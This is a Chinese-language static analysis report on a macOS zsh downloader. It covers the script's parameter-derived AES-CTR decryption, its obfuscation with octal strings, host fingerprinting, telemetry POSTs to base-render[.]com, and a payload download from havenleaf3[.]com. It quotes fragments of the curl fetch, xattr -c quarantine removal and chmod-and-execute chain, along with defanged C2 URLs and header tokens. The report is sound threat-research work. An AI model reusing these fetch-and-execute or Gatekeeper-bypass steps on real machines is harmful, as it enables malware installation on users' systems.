---
title: "恶意样本分析：Unattributed macOS zsh downloader（other · zsh · 06750874）"
published: 2026-11-21
draft: false
description: "恶意（置信度低）：Unattributed macOS zsh downloader · dropper/downloader · 难度 medium · 纯静态分析"
tags: ["dropper", "downloader", "Script"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **Unattributed macOS zsh downloader**（存疑） · 置信度 **低**
> 
> 外层 zsh 脚本以自身参数公式派生密钥（_kb=2367，md5 后作 AES-128 密钥），用 AES-128-CTR(IV=0) 解密内嵌十六进制数据并 gunzip，再 eval 执行。静态解出的二阶段会向 base-render[.]com 回传遥测、从 havenleaf3[.]com 下载可执行文件到 /tmp、用 xattr -c 清除隔离属性、chmod +x 后直接运行。上述代码为脚本本体逻辑，属直接可见的实现，判定为恶意下载器/投放器。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **Unattributed macOS zsh downloader** · _存疑_ |
| 置信度 | **低** |
| 行为类 | dropper · downloader |
| 难度 | medium |
| 首次出现 | 2026-11-20 19:24:02 |
| 分析方法 | 纯静态分析 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/067508744d6916ba0234526eb1886a0e3b7b30d81c2cbfe801d4285bce2ec5ab/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">解密内置二阶段</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027.013</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">参数派生解密密钥</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">八进制拼接命令</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">采集主机信息</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1082</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">回传植入遥测</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `067508744d6916ba0234526eb1886a0e3b7b30d81c2cbfe801d4285bce2ec5ab` |
| MD5 | _未记录_ |
| 大小 | 3,081 字节（3.0 KB） |
| 类型 | other · `zsh` |

## 行为分析

共 **10** 条行为，每条都挂了证据，且全部静态可得。

### 1. 解密内置二阶段

`T1027.013` · 置信度 **高** · 静态

脚本把 _build_tag、_schema_id、_cache_seed 三段十六进制拼接后用 xxd 还原为二进制，以 openssl enc -d -aes-128-ctr 解密并 gunzip 解压，得到 1804 字节的 zsh 二阶段脚本（sha256 1a2ab8d7...）。

> **证据**：off=0x2b1(_cache_seed) / off=0x2a5(_build_tag) / off=0x841(_schema_id) 三段十六进制；off=0xb66 的 openssl enc -d -aes-128-ctr 管线；off=0xbfc eval
> 
> **来源**：`ev-000001` · `ev-000002`

### 2. 参数派生解密密钥

`T1027` · 置信度 **高** · 静态

密钥不硬编码：由 _suite、_batch_n、_region、_timeout_s 计算 _kb=2367，再取 md5('2367') 作为 AES 密钥，IV 固定为全零，增加静态特征规避。

> **证据**：off=0x5d5 的 _kb 计算公式；off=0xb42 的 _k=$(printf '%s' "$_kb" | md5)
> 
> **来源**：`ev-000002`

### 3. 八进制拼接命令

`T1027` · 置信度 **高** · 静态

curl、chmod、xattr 等命令名与 URL 被拆成八进制 printf、单字符变量拼接（如 t3f4a/u9n9/d7sd/s3la/er96/icjvz），运行时才还原，避免明文字符串命中。

> **证据**：off=0x511-0x55a 的 t3f4a=printf '\155\144\065' 等；off=0xb66 的 ${u9n9}${d7sd}/${s3la}${er96}
> 
> **来源**：`ev-000001` · `ev-000002`

### 4. 采集主机信息

`T1082` · 置信度 **中** · 静态

二阶段读取 id -u、sysctl -n hw.memsize 与 df -m / 的可用空间，作为主机指纹/环境信息，供回传时使用。

> **证据**：stage2_payload.sh 第 3-6 行 id -u / sysctl hw.memsize；外层 off=0x6fe df -m /
> 
> **来源**：`ev-000002`

### 5. 回传植入遥测

`T1071.001` · 置信度 **高** · 静态

执行开始时以 curl -X POST 向 hxxps://base-render[.]com/api/metrics/run?event=pasted 发送请求，携带 user 与 BuildID 两个不透明令牌头，输出全部丢弃并在后台执行。

> **证据**：stage2_payload.sh 中 bq43xr=hxxps://base-render[.]com/api/metrics/run?event=pasted 与 curl -fsS -4 ... -H 'user: ...' -H 'BuildID: ...'
> 
> **来源**：`ev-000002`

### 6. 下载后续载荷

`T1105` · 置信度 **高** · 静态

以 curl -fsSL 下载 hxxps://havenleaf3[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv 到 /tmp/.d9mrlg4i.$$，成功后 mv 为 /tmp/.d9mrlg4i，即驻留的可执行载荷。

> **证据**：stage2_payload.sh 中 fdcd3t=hxxps://havenleaf3[.]com/f/... 与 curl -fsSL -o ${tnkxvb} ${fdcd3t} && mv ...
> 
> **来源**：`ev-000002`

### 7. 清除隔离属性

`T1553.001` · 置信度 **高** · 静态

对下载文件执行 xattr -c 清除 macOS 隔离属性（com.apple.quarantine），绕过 Gatekeeper 对下载文件的首次运行拦截。

> **证据**：stage2_payload.sh 中 gch7v=$(printf '\170\141\164\164\162') 即 xattr，随后 ${gch7v} -c ${ylzw5l}
> 
> **来源**：`ev-000002`

### 8. 赋权并执行载荷

`T1059.004` · 置信度 **高** · 静态

用 chmod +x 赋予下载文件执行权限，并在成功下载后直接以 /tmp/.d9mrlg4i 执行，实现二阶段落地运行。

> **证据**：stage2_payload.sh 中 cdwf4=$(printf '\143\150\155\157\144') 即 chmod，${cdwf4} +x ${ylzw5l} && ... && ${ylzw5l}
> 
> **来源**：`ev-000002`

### 9. 执行后回传状态

`T1071.001` · 置信度 **高** · 静态

仅在下载、清除属性、赋权均成功后，再向 hxxps://base-render[.]com/api/metrics/run?event=stager 发送第二次带令牌的 POST，随后执行载荷，可用于统计投放成功率。

> **证据**：stage2_payload.sh 中 rl31a8=...event=stager 与 `{ curl ... } && ${ylzw5l}` 的成功链
> 
> **来源**：`ev-000002`

### 10. 伪装缓存维护

`T1036` · 置信度 **高** · 静态

脚本以 _log/“routine cache maintenance”等注释、$HOME/Library/Caches 保留期统计与磁盘空间检查作掩护，真实动作是解密并执行二阶段。

> **证据**：off=0x64f '# --- routine cache maintenance ---'；off=0x6ca Library/Caches；off=0x77b find ... -mtime +16
> 
> **来源**：`ev-000001` · `ev-000002`


## IOC（已去武器化）

### 网络

:::caution
**待动态验证**：上述地址为静态分析所得，分析环境网络隔离下未观察到成功的连接或会话，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://base-render[.]com/api/metrics/run?event=pasted` | 443 | c2 | 静态 | ⏳ 未观测 |
| http | `hxxps://base-render[.]com/api/metrics/run?event=stager` | 443 | c2 | 静态 | ⏳ 未观测 |
| http | `hxxps://havenleaf3[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv` | 443 | download | 静态 | ⏳ 未观测 |

### 主机

**落地路径**

- `/tmp/.d9mrlg4i`
- `/tmp/.d9mrlg4i.$$`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `base-render[.]com` | 是 | 静态 |
| `c2_port` | `443` | 是 | 静态 |
| `c2_uri` | `/api/metrics/run?event=pasted; /api/metrics/run?event=stager` | 是 | 静态 |
| `download_url` | `hxxps://havenleaf3[.]com/f/hxjvvipsyjzsdxrzfdjwka/pnxco9yv` | 是 | 静态 |
| `install_path` | `/tmp/.d9mrlg4i` | 是 | 静态 |
| `encryption_algo` | `AES-128-CTR (IV=0000...0) + gzip` | 是 | 静态 |
| `key_derivation` | `_kb=((7*189+6*7+2)%90000)+1000=2367; key=md5('2367')=300891a62162b960cf02ce3827bb363c` | 是 | 静态 |
| `http_header_user` | `AgIatvSKvs7wrQOffteWKKtDHNTFSZBGfP6dM4swrKfjliiND9ql (pasted) / AgKTRXztxMrZcQi7P_MGIXJBA8kucDdMqGr75_Q-MqTwcdWrKhwb (stager)` | 是 | 静态 |
| `http_header_buildid` | `AgLU6TbrfZMOQKMWZjt5r_W0Fap5okWEkm3naLKzCZ1HdsE (pasted) / AgJdTgGfw2BDqZRMoJPJzkLdvca2qFOnW8ENrZonWf4ec04 (stager)` | 是 | 静态 |
| `cleanup_command` | `xattr -c /tmp/.d9mrlg4i; chmod +x /tmp/.d9mrlg4i` | 是 | 静态 |
| `campaign_id` | `-` | 否 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 不能断言其为窃密木马（stealer）：第二阶段实体未取回，现有代码只展示下载、清除隔离属性与执行，未见凭据/浏览器数据收集逻辑。
- 不能声称样本已成功外联或上线：本次未执行样本，也没有任何动态会话或网络观测，C2 仅由静态解密得出。
- 不能把 $HOME/Library/Caches 的保留期/磁盘检查当成真实功能：该段只做统计与打印，未删除或写入任何文件，属掩护性代码。
- 不能断言 havenleaf3[.]com 上的文件类型或最终能力：该文件未被下载分析。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 纯静态分析 |
| 脱壳 | 否 |

**局限与待验证**

1. 本次仅有静态证据：样本为 macOS zsh 脚本，当前环境无对应动态分析通道，未观察到任何运行时行为。
2. havenleaf3[.]com 上的第二阶段可执行载荷未取回，其真实功能、家族归属与后续 C2 无法确认。
3. xattr -c、chmod +x 与执行行为来自解密后的脚本文本，未在真实 macOS 上验证。
4. 两个 base-render[.]com 端点仅从脚本静态还原，未验证其可达性与响应内容。
5. 家族命名缺少厂商/YARA/公开报告佐证，按行为暂记为未归属的 macOS zsh 下载器。

## 证据索引

<details>
<summary>展开 2 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ev-000001` | 字符串提取 | 抽取外层脚本 44 条 ASCII 字符串，定位 _cache_seed/_build_tag/_schema_id 与变形命令；无 flag 命中。 |
| `ev-000002` | evidence.record | 静态复现解密链：_kb=2367 → md5 → AES-128-CTR(IV=0) → gunzip，得到二阶段并还原全部八进制字符串与 URL。 |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
